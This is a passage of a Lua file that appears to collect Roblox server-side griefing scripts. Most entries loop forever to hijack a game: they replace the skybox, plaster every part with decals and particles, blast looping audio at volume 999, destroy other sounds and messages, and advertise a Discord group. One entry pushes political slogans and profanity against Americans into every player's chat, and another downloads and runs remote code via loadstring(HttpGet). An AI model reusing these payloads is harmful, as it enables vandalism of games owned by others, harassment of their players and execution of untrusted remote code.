		sky.SkyboxFt = imageId
		sky.SkyboxLf = imageId
		sky.SkyboxRt = imageId
		sky.SkyboxUp = imageId
		sky.Parent = Lighting

		task.wait(2)
	end
end)

local function applyParticles(character)
    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
    if not torso then return end
    
    for _, particle in ipairs(torso:GetChildren()) do
        if particle:IsA("ParticleEmitter") and particle.Texture ~= imageId then
            particle:Destroy()
        end
    end
    
    for _, velocitySpread in ipairs({0, 0, 0}) do
        local existing = false
        
        for _, particle in ipairs(torso:GetChildren()) do
            if particle:IsA("ParticleEmitter") and particle.Texture == imageId and particle.VelocitySpread == velocitySpread then
                existing = true
                break
            end
        end
        
        if not existing then
            local pe = Instance.new("ParticleEmitter")
            pe.Texture = imageId
            pe.VelocitySpread = velocitySpread
            pe.Parent = torso
        end
    end
end

task.spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                applyParticles(player.Character)
            end
        end
        task.wait(2)
    end
end)

task.spawn(function()
	local Lighting = game:GetService("Lighting")

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 1, 1),
		FogEnd = 10000000000,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}
	
	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("ColorCorrectionEffect") then
				effect:Destroy()
			end
		end
	end

	task.spawn(function()
		while true do
			for property, value in pairs(defaultValues) do
				pcall(function()
					Lighting[property] = value
				end)
			end
			restoreLightingEffects()
			task.wait(1)
		end
	end)
end)

local function applyParticlesToPart(part)
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture ~= imageId then
            child:Destroy()
        end
    end

    local alreadyHas = false
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture == imageId then
            alreadyHas = true
            break
        end
    end

    if not alreadyHas then
        local pe = Instance.new("ParticleEmitter")
        pe.Texture = imageId
        pe.VelocitySpread = 360
        pe.Rate = 10
        pe.Lifetime = NumberRange.new(5)
        pe.Speed = NumberRange.new(10)
        pe.Parent = part
        pe.SpreadAngle = Vector2.new(0, 0)
		pe.Acceleration = Vector3.new(0, 0, 0)
		
		local fe = Instance.new("ParticleEmitter")
        fe.Texture = imageId
        fe.VelocitySpread = 360
        fe.Rate = 40
        fe.Lifetime = NumberRange.new(5)
        fe.Speed = NumberRange.new(10)
        fe.Parent = part
    end
end

task.spawn(function()
    while true do
        local parts = {}
        for _, part in ipairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                table.insert(parts, part)
            end
        end

        for i = 1, #parts, batchSize do
            for j = i, math.min(i + batchSize - 1, #parts) do
                applyParticlesToPart(parts[j])
            end
            
            task.wait(1)
        end

        task.wait(1)
    end
end)

local function clearDecals(part)
	for _, child in ipairs(part:GetChildren()) do
		if child:IsA("Decal") then
			child:Destroy()
		end
	end
end

local function applyDecals(part)
	for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
		local decal = Instance.new("Decal")
		decal.Texture = imageId
		decal.Face = face
		decal.Parent = part
	end
end

task.spawn(function()
	while true do
		local allParts = {}
		for _, part in ipairs(Workspace:GetDescendants()) do
			if part:IsA("BasePart") then
				table.insert(allParts, part)
			end
		end

		local index = 1
		while index <= #allParts do
			for i = index, math.min(index + 99, #allParts) do
				local part = allParts[i]
				part.Material = Enum.Material.Plastic
				clearDecals(part)
				applyDecals(part)
			end
			index += 100
			task.wait(1)
		end
	end
end)

task.spawn(function()
	while true do
		local sound = Workspace:FindFirstChild("canttouchthissound2")
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "canttouchthissound2"
			sound.SoundId = musicId
			sound.Looped = true
			sound.TimePosition = 17.5
			sound.PlaybackSpeed = 1.4
			sound.Volume = 999
			sound.Parent = Workspace
			sound:Play()
		end
		task.wait(2)
	end
end)

local function write(text, object)
	if object:IsA("Hint") then
		local count = object:FindFirstChild("Count")
		if not count then
			count = Instance.new("NumberValue")
			count.Name = "Count"
			count.Parent = object
		end
		count.Value += 1
		local startCount = count.Value

		for i = 1, #text do
			if count.Value == startCount then
				object.Text = string.sub(text, 1, i)
				task.wait(0.06)
			else
				break
			end
		end
	end
end

task.spawn(function()
	local bro = Instance.new("Hint")
	bro.Name = "canttouchthishint"
	bro.Parent = workspace

	spawn(function()
		while true do
			local existing = workspace:FindFirstChild("canttouchthishint")
			if not existing then
				local bro = Instance.new("Hint")
				bro.Name = "canttouchthishint"
				bro.Parent = workspace
				write("join team noxious later maybe idk | gg/bwdk8vAy8n", bro)
			end
			task.wait(1)
		end
	end)

	write("join team noxious later maybe idk | gg/bwdk8vAy8n", bro)
end)

spawn(function()
	while true do
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "canttouchthishint" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "canttouchthishint" then
				message:Destroy()
			end
		end
		for _, sound in pairs(game:GetDescendants()) do
			if sound:IsA("Sound") and sound.Name ~= "canttouchthissound2" then
				sound:Destroy()
			end
		end
		wait(0.5)
	end
end)

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			local function mute(container)
				for _, s in ipairs(container:GetDescendants()) do
					if s:IsA("Sound") and s.Playing then
						s.Playing = false
					end
				end
			end
			if player.Character then mute(player.Character) end
			local bp = player:FindFirstChildOfClass("Backpack")
			if bp then mute(bp) end
		end
		task.wait(2)
	end
end)
]], "CS / SS")

cscript("shedletsky", [[
local batchSize = 1000000
local imageId = "rbxassetid://85312612489831"
local musicId = "rbxassetid://101389433601746"

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

task.spawn(function()
	while true do
		local oldSky = Lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
		end

		local sky = Instance.new("Sky")
		sky.Name = "PersistentSky"
		sky.SkyboxBk = imageId
		sky.SkyboxDn = imageId
		sky.SkyboxFt = imageId
		sky.SkyboxLf = imageId
		sky.SkyboxRt = imageId
		sky.SkyboxUp = imageId
		sky.Parent = Lighting

		task.wait(2)
	end
end)

local function applyParticles(character)
    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
    if not torso then return end
    
    for _, particle in ipairs(torso:GetChildren()) do
        if particle:IsA("ParticleEmitter") and particle.Texture ~= imageId then
            particle:Destroy()
        end
    end
    
    for _, velocitySpread in ipairs({0, 0, 0}) do
        local existing = false
        
        for _, particle in ipairs(torso:GetChildren()) do
            if particle:IsA("ParticleEmitter") and particle.Texture == imageId and particle.VelocitySpread == velocitySpread then
                existing = true
                break
            end
        end
        
        if not existing then
            local pe = Instance.new("ParticleEmitter")
            pe.Texture = imageId
            pe.VelocitySpread = velocitySpread
            pe.Parent = torso
        end
    end
end

task.spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                applyParticles(player.Character)
            end
        end
        task.wait(2)
    end
end)

task.spawn(function()
	local Lighting = game:GetService("Lighting")

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 1, 1),
		FogEnd = 10000000000,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}
	
	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("ColorCorrectionEffect") then
				effect:Destroy()
			end
		end
	end

	task.spawn(function()
		while true do
			for property, value in pairs(defaultValues) do
				pcall(function()
					Lighting[property] = value
				end)
			end
			restoreLightingEffects()
			task.wait(1)
		end
	end)
end)

local function applyParticlesToPart(part)
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture ~= imageId then
            child:Destroy()
        end
    end

    local alreadyHas = false
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture == imageId then
            alreadyHas = true
            break
        end
    end

    if not alreadyHas then
        local pe = Instance.new("ParticleEmitter")
        pe.Texture = imageId
        pe.VelocitySpread = 360
        pe.Rate = 10
        pe.Lifetime = NumberRange.new(5)
        pe.Speed = NumberRange.new(10)
        pe.Parent = part
        pe.SpreadAngle = Vector2.new(0, 0)
		pe.Acceleration = Vector3.new(0, 0, 0)
		
		local fe = Instance.new("ParticleEmitter")
        fe.Texture = imageId
        fe.VelocitySpread = 360
        fe.Rate = 40
        fe.Lifetime = NumberRange.new(5)
        fe.Speed = NumberRange.new(10)
        fe.Parent = part
    end
end

task.spawn(function()
    while true do
        local parts = {}
        for _, part in ipairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                table.insert(parts, part)
            end
        end

        for i = 1, #parts, batchSize do
            for j = i, math.min(i + batchSize - 1, #parts) do
                applyParticlesToPart(parts[j])
            end
            
            task.wait(1)
        end

        task.wait(1)
    end
end)

task.spawn(function()
	while true do
		local sound = Workspace:FindFirstChild("canttouchthissound3")
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "canttouchthissound3"
			sound.SoundId = musicId
			sound.Looped = true
			sound.Volume = 999
			sound.Parent = Workspace
			sound:Play()
		end
		task.wait(2)
	end
end)

spawn(function()
	while true do
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "canttouchthishint" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "canttouchthishint" then
				message:Destroy()
			end
		end
		for _, sound in pairs(game:GetDescendants()) do
			if sound:IsA("Sound") and sound.Name ~= "canttouchthissound3" then
				sound:Destroy()
			end
		end
		wait(0.5)
	end
end)

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			local function mute(container)
				for _, s in ipairs(container:GetDescendants()) do
					if s:IsA("Sound") and s.Playing then
						s.Playing = false
					end
				end
			end
			if player.Character then mute(player.Character) end
			local bp = player:FindFirstChildOfClass("Backpack")
			if bp then mute(bp) end
		end
		task.wait(2)
	end
end)
]], "CS / SS")

cscript("chinaify", [[
local ChatService = game:GetService("Chat")
local Players = game:GetService("Players")

local function bubl(text)
	for _, player in ipairs(Players:GetPlayers()) do
		if player.Character and player.Character:FindFirstChild("Head") then
			ChatService:Chat(player.Character.Head, text, Enum.ChatColor.White)
		end
	end
end

spawn(function()
	bubl("习近平万岁!!! GLORY TO THE CCP!!! 🇨🇳🇨🇳 上帝保佑你金山银山!!! 🇨🇳 向我们的光荣领袖习近平致敬!!! 操唐纳德 特朗普，操所有美国人!!! 🇨🇳🇨🇳🇨🇳")
end)

local batchSize = 1000000
local imageId = "rbxassetid://13464805869"
local musicId = "rbxassetid://134713831368801"

local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

task.spawn(function()
	while true do
		local oldSky = Lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
		end

		local sky = Instance.new("Sky")
		sky.Name = "PersistentSky"
		sky.SkyboxBk = "rbxassetid://15886770889"
		sky.SkyboxDn = "rbxassetid://15886770889"
		sky.SkyboxFt = "rbxassetid://15886770889"
		sky.SkyboxLf = "rbxassetid://15886770889"
		sky.SkyboxRt = "rbxassetid://15886770889"
		sky.SkyboxUp = "rbxassetid://15886770889"
		sky.Parent = Lighting

		task.wait(2)
	end
end)

local function applyParticles(character)
    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
    if not torso then return end
    
    for _, particle in ipairs(torso:GetChildren()) do
        if particle:IsA("ParticleEmitter") and particle.Texture ~= imageId then
            particle:Destroy()
        end
    end
    
    for _, velocitySpread in ipairs({0, 0, 0}) do
        local existing = false
        
        for _, particle in ipairs(torso:GetChildren()) do
            if particle:IsA("ParticleEmitter") and particle.Texture == imageId and particle.VelocitySpread == velocitySpread then
                existing = true
                break
            end
        end
        
        if not existing then
            local pe = Instance.new("ParticleEmitter")
            pe.Texture = imageId
            pe.VelocitySpread = velocitySpread
            pe.Parent = torso
        end
    end
end

task.spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                applyParticles(player.Character)
            end
        end
        task.wait(2)
    end
end)

task.spawn(function()
	local Lighting = game:GetService("Lighting")

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 0, 0),
		FogEnd = 150,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}
	
	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("ColorCorrectionEffect") then
				effect:Destroy()
			end
		end
	end

	task.spawn(function()
		while true do
			for property, value in pairs(defaultValues) do
				pcall(function()
					Lighting[property] = value
				end)
			end
			restoreLightingEffects()
			task.wait(1)
		end
	end)
end)

local function applyParticlesToPart(part)
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture ~= imageId then
            child:Destroy()
        end
    end

    local alreadyHas = false
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture == imageId then
            alreadyHas = true
            break
        end
    end

    if not alreadyHas then
        local pe = Instance.new("ParticleEmitter")
        pe.Texture = imageId
        pe.VelocitySpread = 360
        pe.Rate = 10
        pe.Lifetime = NumberRange.new(5)
        pe.Speed = NumberRange.new(10)
        pe.Parent = part
        pe.SpreadAngle = Vector2.new(0, 0)
		pe.Acceleration = Vector3.new(0, 0, 0)
		
		local fe = Instance.new("ParticleEmitter")
        fe.Texture = imageId
        fe.VelocitySpread = 360
        fe.Rate = 40
        fe.Lifetime = NumberRange.new(5)
        fe.Speed = NumberRange.new(10)
        fe.Parent = part
    end
end

task.spawn(function()
    while true do
        local parts = {}
        for _, part in ipairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                table.insert(parts, part)
            end
        end

        for i = 1, #parts, batchSize do
            for j = i, math.min(i + batchSize - 1, #parts) do
                applyParticlesToPart(parts[j])
            end
            
            task.wait(1)
        end

        task.wait(1)
    end
end)

task.spawn(function()
	while true do
		local sound = Workspace:FindFirstChild("canttouchthissound4")
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "canttouchthissound4"
			sound.SoundId = musicId
			sound.Looped = true
			sound.TimePosition = 18.2
			sound.Volume = 999
			sound.Parent = Workspace
			sound:Play()
		end
		task.wait(2)
	end
end)

local function write(text, object)
	if object:IsA("Hint") then
		local count = object:FindFirstChild("Count")
		if not count then
			count = Instance.new("NumberValue")
			count.Name = "Count"
			count.Parent = object
		end
		count.Value += 1
		local startCount = count.Value

		for i = 1, #text do
			if count.Value == startCount then
				object.Text = string.sub(text, 1, i)
				task.wait(0.06)
			else
				break
			end
		end
	end
end

task.spawn(function()
	local bro = Instance.new("Hint")
	bro.Name = "canttouchthishint4"
	bro.Parent = workspace

	spawn(function()
		while true do
			local existing = workspace:FindFirstChild("canttouchthishint4")
			if not existing then
				local bro = Instance.new("Hint")
				bro.Name = "canttouchthishint4"
				bro.Parent = workspace
				write("习近平万岁!!! GLORY TO THE CCP!!! 🇨🇳🇨🇳 上帝保佑你金山银山!!! 🇨🇳 向我们的光荣领袖习近平致敬!!! 操唐纳德 特朗普，操所有美国人!!! 🇨🇳🇨🇳🇨🇳", bro)
			end
			task.wait(1)
		end
	end)

	write("习近平万岁!!! GLORY TO THE CCP!!! 🇨🇳🇨🇳 上帝保佑你金山银山!!! 🇨🇳 向我们的光荣领袖习近平致敬!!! 操唐纳德 特朗普，操所有美国人!!! 🇨🇳🇨🇳🇨🇳", bro)
end)

spawn(function()
	while true do
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "canttouchthishint4" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "canttouchthishint4" then
				message:Destroy()
			end
		end
		for _, sound in pairs(game:GetDescendants()) do
			if sound:IsA("Sound") and sound.Name ~= "canttouchthissound4" then
				sound:Destroy()
			end
		end
		wait(0.5)
	end
end)

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			local function mute(container)
				for _, s in ipairs(container:GetDescendants()) do
					if s:IsA("Sound") and s.Playing then
						s.Playing = false
					end
				end
			end
			if player.Character then mute(player.Character) end
			local bp = player:FindFirstChildOfClass("Backpack")
			if bp then mute(bp) end
		end
		task.wait(2)
	end
end)
]], "CS / SS")

cscript("dreamybull", [[
local batchSize = 1000000
local imageId = "rbxassetid://13853621129"
local musicId = "rbxassetid://94356638905764"

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

task.spawn(function()
	while true do
		local oldSky = Lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
		end

		local sky = Instance.new("Sky")
		sky.Name = "PersistentSky"
		sky.SkyboxBk = imageId
		sky.SkyboxDn = imageId
		sky.SkyboxFt = imageId
		sky.SkyboxLf = imageId
		sky.SkyboxRt = imageId
		sky.SkyboxUp = imageId
		sky.Parent = Lighting

		task.wait(2)
	end
end)

local function applyParticles(character)
	local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
	if not torso then return end

	for _, particle in ipairs(torso:GetChildren()) do
		if particle:IsA("ParticleEmitter") and particle.Texture ~= imageId then
			particle:Destroy()
		end
	end

	for _, velocitySpread in ipairs({0, 0, 0}) do
		local existing = false

		for _, particle in ipairs(torso:GetChildren()) do
			if particle:IsA("ParticleEmitter") and particle.Texture == imageId and particle.VelocitySpread == velocitySpread then
				existing = true
				break
			end
		end

		if not existing then
			local pe = Instance.new("ParticleEmitter")
			pe.Texture = imageId
			pe.VelocitySpread = velocitySpread
			pe.Parent = torso
		end
	end
end

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			if player.Character then
				applyParticles(player.Character)
			end
		end
		task.wait(2)
	end
end)

task.spawn(function()
	local Lighting = game:GetService("Lighting")

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 1, 1),
		FogEnd = 10000000000,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}

	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("ColorCorrectionEffect") then
				effect:Destroy()
			end
		end
	end

	task.spawn(function()
		while true do
			for property, value in pairs(defaultValues) do
				pcall(function()
					Lighting[property] = value
				end)
			end
			restoreLightingEffects()
			task.wait(1)
		end
	end)
end)

local function applyParticlesToPart(part)
	for _, child in ipairs(part:GetChildren()) do
		if child:IsA("ParticleEmitter") and child.Texture ~= imageId then
			child:Destroy()
		end
	end

	local alreadyHas = false
	for _, child in ipairs(part:GetChildren()) do
		if child:IsA("ParticleEmitter") and child.Texture == imageId then
			alreadyHas = true
			break
		end
	end

	if not alreadyHas then
		local pe = Instance.new("ParticleEmitter")
		pe.Texture = imageId
		pe.VelocitySpread = 360
		pe.Rate = 10
		pe.Lifetime = NumberRange.new(5)
		pe.Speed = NumberRange.new(10)
		pe.Parent = part
		pe.SpreadAngle = Vector2.new(0, 0)
		pe.Acceleration = Vector3.new(0, 0, 0)
		
		local fe = Instance.new("ParticleEmitter")
        fe.Texture = imageId
        fe.VelocitySpread = 360
        fe.Rate = 40
        fe.Lifetime = NumberRange.new(5)
        fe.Speed = NumberRange.new(10)
        fe.Parent = part
	end
end

task.spawn(function()
	while true do
		local parts = {}
		for _, part in ipairs(workspace:GetDescendants()) do
			if part:IsA("BasePart") then
				table.insert(parts, part)
			end
		end

		for i = 1, #parts, batchSize do
			for j = i, math.min(i + batchSize - 1, #parts) do
				applyParticlesToPart(parts[j])
			end

			task.wait(1)
		end

		task.wait(1)
	end
end)

task.spawn(function()
	while true do
		local sound = Workspace:FindFirstChild("canttouchthissound5")
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "canttouchthissound5"
			sound.SoundId = musicId
			sound.Looped = true
			sound.Volume = 999
			sound.Parent = Workspace
			sound:Play()
		end
		task.wait(2)
	end
end)

spawn(function()
	while true do
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "canttouchthishint" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "canttouchthishint" then
				message:Destroy()
			end
		end
		for _, sound in pairs(game:GetDescendants()) do
			if sound:IsA("Sound") and sound.Name ~= "canttouchthissound5" then
				sound:Destroy()
			end
		end
		wait(0.5)
	end
end)

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			local function mute(container)
				for _, s in ipairs(container:GetDescendants()) do
					if s:IsA("Sound") and s.Playing then
						s.Playing = false
					end
				end
			end
			if player.Character then mute(player.Character) end
			local bp = player:FindFirstChildOfClass("Backpack")
			if bp then mute(bp) end
		end
		task.wait(2)
	end
end)

local function clearDecals(part)
	for _, child in ipairs(part:GetChildren()) do
		if child:IsA("Decal") then
			child:Destroy()
		end
	end
end

local function applyDecals(part)
	for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
		local decal = Instance.new("Decal")
		decal.Texture = imageId
		decal.Face = face
		decal.Parent = part
	end
end

task.spawn(function()
	while true do
		local allParts = {}
		for _, part in ipairs(Workspace:GetDescendants()) do
			if part:IsA("BasePart") then
				table.insert(allParts, part)
			end
		end

		local index = 1
		while index <= #allParts do
			for i = index, math.min(index + 99, #allParts) do
				local part = allParts[i]
				part.Material = Enum.Material.Plastic
				clearDecals(part)
				applyDecals(part)
			end
			index += 100
			task.wait(1)
		end
	end
end)
]], "CS / SS")

cscript("ghosthub", [[
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-GhostHub-Universal-Games-25151"))()
]], "LS")

cscript("ds tester 1", [[
	function test2(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA"Decal"and v.Texture ~= "rbxassetid://131178173049173" then
				v.Parent = nil
			elseif v:IsA"BasePart"then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://131178173049173"
				Two.Texture = "rbxassetid://131178173049173"
				Three.Texture = "rbxassetid://131178173049173"
				Four.Texture = "rbxassetid://131178173049173"
				Five.Texture = "rbxassetid://131178173049173"
				Six.Texture = "rbxassetid://131178173049173"
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			test2(v)
		end
	end
	function test3(root)
		for _, v in pairs(root:GetChildren()) do
			test3(v)
		end
	end
	test2(game.Workspace)
	test3(game.Workspace)

	lighting = game:GetService"Lighting"

local oldSky = lighting:FindFirstChildOfClass("Sky")
if oldSky then
    oldSky:Destroy()
    task.wait()
end

local sky = Instance.new("Sky")
sky.SkyboxBk = "rbxassetid://131178173049173"
sky.SkyboxDn = "rbxassetid://131178173049173"
sky.SkyboxFt = "rbxassetid://131178173049173"
sky.SkyboxLf = "rbxassetid://131178173049173"
sky.SkyboxRt = "rbxassetid://131178173049173"
sky.SkyboxUp = "rbxassetid://131178173049173"

sky.Parent = lighting
]], "CS / SS")

cscript("ds tester 2", [[
	function test2(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA"Decal"and v.Texture ~= "rbxassetid://89442759973598" then
				v.Parent = nil
			elseif v:IsA"BasePart"then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://89442759973598"
				Two.Texture = "rbxassetid://89442759973598"
				Three.Texture = "rbxassetid://89442759973598"
				Four.Texture = "rbxassetid://89442759973598"
				Five.Texture = "rbxassetid://89442759973598"
				Six.Texture = "rbxassetid://89442759973598"
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			test2(v)
		end
	end
	function test3(root)
		for _, v in pairs(root:GetChildren()) do
			test3(v)
		end
	end
	test2(game.Workspace)
	test3(game.Workspace)

	lighting = game:GetService"Lighting"

local oldSky = lighting:FindFirstChildOfClass("Sky")
if oldSky then
    oldSky:Destroy()
    task.wait()
end

local sky = Instance.new("Sky")
sky.SkyboxBk = "rbxassetid://89442759973598"
sky.SkyboxDn = "rbxassetid://89442759973598"
sky.SkyboxFt = "rbxassetid://89442759973598"
sky.SkyboxLf = "rbxassetid://89442759973598"
sky.SkyboxRt = "rbxassetid://89442759973598"
sky.SkyboxUp = "rbxassetid://89442759973598"

sky.Parent = lighting
]], "CS / SS")

cscript("ds tester 3", [[
	function test2(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA"Decal"and v.Texture ~= "rbxassetid://82751535106374" then
				v.Parent = nil
			elseif v:IsA"BasePart"then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://82751535106374"
				Two.Texture = "rbxassetid://82751535106374"
				Three.Texture = "rbxassetid://82751535106374"
				Four.Texture = "rbxassetid://82751535106374"
				Five.Texture = "rbxassetid://82751535106374"
				Six.Texture = "rbxassetid://82751535106374"
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			test2(v)
		end
	end
	function test3(root)
		for _, v in pairs(root:GetChildren()) do
			test3(v)
		end
	end
	test2(game.Workspace)
	test3(game.Workspace)

	lighting = game:GetService"Lighting"

local oldSky = lighting:FindFirstChildOfClass("Sky")
if oldSky then
    oldSky:Destroy()
    task.wait()
end

local sky = Instance.new("Sky")
sky.SkyboxBk = "rbxassetid://82751535106374"
sky.SkyboxDn = "rbxassetid://82751535106374"
sky.SkyboxFt = "rbxassetid://82751535106374"
sky.SkyboxLf = "rbxassetid://82751535106374"
sky.SkyboxRt = "rbxassetid://82751535106374"
sky.SkyboxUp = "rbxassetid://82751535106374"

sky.Parent = lighting
]], "CS / SS")

cscript("manon billboards", [[
local imgs = {
	"http://www.roblox.com/asset/?id=101237382805423",
	"http://www.roblox.com/asset/?id=89208523637949",
	"http://www.roblox.com/asset/?id=71661000559292",
	"http://www.roblox.com/asset/?id=90561155276969",
	"http://www.roblox.com/asset/?id=94754770398224",
	"http://www.roblox.com/asset/?id=139866687601719",
	"http://www.roblox.com/asset/?id=73504679034131",
	"http://www.roblox.com/asset/?id=125003859591663",
	"http://www.roblox.com/asset/?id=133067734889959",
	"http://www.roblox.com/asset/?id=93193616917547",
	"http://www.roblox.com/asset/?id=121611382430450",
	"http://www.roblox.com/asset/?id=89967226392530",
	"http://www.roblox.com/asset/?id=126583685682788",
	"http://www.roblox.com/asset/?id=94213248040489"
}

local BILLBOARD_NAME = "AnimatedBillboard"

function makebill(part)
	if part:FindFirstChild(BILLBOARD_NAME) then return end

	local bill = Instance.new("BillboardGui")
	bill.Name = BILLBOARD_NAME
	bill.Size = UDim2.new(3, 0, 3, 0)
	bill.AlwaysOnTop = true
	bill.Adornee = part
	bill.Parent = part

	local imageLabels = {}

	for i, imgUrl in ipairs(imgs) do
		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Size = UDim2.new(1, 0, 1, 0)
		imageLabel.BackgroundTransparency = 1
		imageLabel.Image = imgUrl
		imageLabel.Visible = false
		imageLabel.Parent = bill
		table.insert(imageLabels, imageLabel)
	end

	task.spawn(function()
		local index = 1
		while bill and bill.Parent do
			for i, label in ipairs(imageLabels) do
				label.Visible = (i == index)
			end
			index = (index % #imageLabels) + 1
			task.wait(0.1)
		end
	end)
end

function isPlayerHead(part)
	return part:IsA("Part") and part.Name == "Head"
		and part.Parent and part.Parent:FindFirstChildOfClass("Humanoid")
end

